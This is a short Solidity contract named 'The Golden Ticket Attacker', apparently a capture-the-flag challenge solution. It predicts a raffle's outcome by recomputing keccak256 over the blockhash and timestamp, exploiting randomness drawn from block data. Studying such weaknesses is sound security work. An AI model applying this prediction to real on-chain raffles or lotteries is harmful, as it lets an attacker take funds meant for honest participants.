// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

/// @title The Golden Ticket Attacker
/// @author https://twitter.com/AlanRacciatti
contract GoldenTicketAttacker {
    function getRaffleInput(bytes32 _blockhash, uint256 _timestamp)
        external
        pure
        returns (uint256 _guess)
    {
        _guess = uint256(keccak256(abi.encodePacked(_blockhash, _timestamp)));
    }
}
